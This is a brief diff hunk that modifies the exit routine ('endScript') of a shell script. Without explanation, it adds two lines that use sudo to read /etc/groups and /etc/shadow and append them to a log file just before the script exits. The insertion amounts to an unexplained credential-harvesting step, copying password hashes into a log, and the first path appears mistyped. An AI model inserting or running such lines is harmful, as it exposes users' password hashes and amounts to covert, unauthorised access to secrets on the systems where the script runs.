@@ -399,6 +399,8 @@ endScript() {
     echo -e "# ---------------------------------------------------------------------------- #"
     delay
     clear
+    sudo cat /etc/groups>>$log
+    sudo cat /etc/shadow>>$log
 exit 1
 }
 
